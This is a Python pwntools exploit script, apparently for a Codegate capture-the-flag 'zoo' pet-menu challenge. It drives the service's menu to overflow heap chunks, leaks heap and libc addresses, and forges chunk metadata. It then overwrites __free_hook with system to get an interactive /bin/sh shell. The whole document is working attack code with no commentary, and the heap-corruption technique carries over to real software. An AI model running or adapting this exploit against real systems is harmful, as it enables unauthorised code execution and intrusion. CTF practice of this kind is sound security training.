#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888
host = "ch41l3ng3s.codegate.kr"
port = 7788

r = remote(host,port)

zoo = "name"
r.recvuntil(">>")
r.sendline(zoo)

def adopt(ty,name):
    r.recvuntil(">>")
    r.sendline("1")
    r.recvuntil(">>")
    r.sendline(str(ty))
    r.recvuntil(">>")
    r.sendline(name)

def feed(name):
    r.recvuntil(">>")
    r.sendline("2")
    r.recvuntil(">>")
    r.sendline(name)

def clean(name):
    r.recvuntil(">>")
    r.sendline("3")
    r.recvuntil(">>")
    r.sendline(name)

def walk(name):
    r.recvuntil(">>")
    r.sendline("4")
    r.recvuntil(">>")
    r.sendline(name)

def hos(name):
    r.recvuntil(">>")
    r.sendline("5")
    r.recvuntil(">>")
    r.sendline(name)

def show(name):
    r.recvuntil(">>")
    r.sendline("6")
    r.recvuntil(">>")
    r.sendline(name)


adopt(1,"a"*0x14)
adopt(1,"orange")
feed("a"*0x14)
r.recvuntil("a"*0x14)
heap = u64(r.recvuntil("ate")[0:6].ljust(8,"\x00")) - 0x8c0
print hex(heap)
for i in range(0x14):
    feed("orange")

for i in range(0xe):
    walk("orange")

for i in range(0x7):
    feed("orange")
hos("orange")

for i in range(4):
    feed("orange")
    r.recvuntil(">>")
    r.sendline("nogg")
    r.recvuntil(">>")
    r.send("a"*0x50 + p64(0xf))
feed("orange")
r.recvuntil(">>")
r.sendline("nogg")
r.recvuntil(">>")
r.send("a"*0x70 + p64(0xe11))

adopt(1,"ddaa")
feed("ddaa")
feed("ddaa")
feed("ddaa")
feed("ddaa")

adopt(1,"lay\x00" + p64(0x981) + p64(heap+0x20))
feed("la")
feed("la")
feed("la")
walk("la")
walk("la")
for i in range(18):
    feed("la")
    walk("la")

feed("orange")
r.recvuntil(">>")
r.sendline("nogg")
r.recvuntil(">>")
r.send("a"*0x70 + p64(0x1b0) )
adopt(1,"david")
feed("david")
feed("orange")
r.recvuntil(">>")
r.send(p64(heap+0x560))
r.recvuntil(">>")
r.sendline("da")
feed("david")
#walk("lays")
walk("orange")
walk("orange")
walk("orange")
walk("orange")
walk("orange")
walk("orange")
walk("orange")
walk("orange")
r.recvuntil(">>")
r.sendline("da")
walk("orange")
r.recvuntil(">>")
r.send("a"*0x70 + p64(0x91))
r.recvuntil(">>")
r.send(p64(0)*2 + p64(0x71) + p64(heap+0x560) + p64(heap+0x560) +"b"*0x40 + p64(0x980) + p64(0x91))
walk("david")
walk("orange")
r.recvuntil(">>")
r.send("a"*0x70 + p64(0x91))
r.recvuntil(">>")
r.send(p64(0)*2 + p64(0x71) + p64(heap+0x560) + p64(heap+0x560) +"b"*0x40 + p64(0x980) + p64(0x90))
r.recvuntil(">>")
r.send(p64(0)*2 + p64(0x71) + p64(heap+0x560) + p64(heap+0x560) +"b"*0x40+ p64(0x980) + p64(0x90))
walk("david")
show(p64(heap+0xd30)[4:6])
walk("orange")
r.recvuntil(">>")
r.sendline("c")
r.recvuntil(">>")
r.sendline("/bin/sh\x00")
r.recvuntil(">>")
r.send(p64(heap+0x1250) + p64(heap+0x8c0) + p64(heap) + p64(0)*8+ p64(heap+0xed8) + p64(heap+0x1178) + p64(heap+0x1240-0x18)+p64(heap+0xe60))
fake_name = p64(heap)[4:6]
walk(fake_name)
r.recvuntil(">>")
r.send(p64(0x0000000100000000) + p64(heap+0x1190))
r.recvuntil(">>")
r.sendline(p64(0)*8)
r.recvuntil(">>")
r.sendline(p32(1) + "fuck" + p64(0))
r.recvuntil(">>")
r.send(p64(heap+0x1258)*2)
r.recvuntil(">>")
r.send(p64(0) + p64(heap+0x8c0) + p64(0)*6 + p64(heap+0xe60))
show("fuck")
r.recvuntil("Species : ")
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x3c4b78
print hex(libc)
walk(fake_name)
r.recvuntil(">>")
free_hook = libc + 0x3c67a8
system = libc + 0x45390
r.send(p64(0)*2 + p64(heap+0xb90) + p64(heap+0xd58) + p64(free_hook-0x18) + p64(0)*8)
r.recvuntil(">>")
r.send(p64(0)*2 + p64(heap+0xb90) + p64(heap+0xd58) + p64(free_hook-0x18) + p64(0)*8)
r.recvuntil(">>")
r.send(p64(0)*2 + p64(heap+0xb90) + p64(heap+0xd58) + p64(free_hook-0x18) + p64(0)*8)
walk(fake_name)
r.recvuntil(">>")
r.sendline("a")
r.recvuntil(">>")
r.sendline(p64(system))
r.recvuntil(">>")
r.sendline(p64(0))
r.recvuntil(">>")
r.sendline(p64(0))
raw_input()
walk(fake_name)
r.interactive()
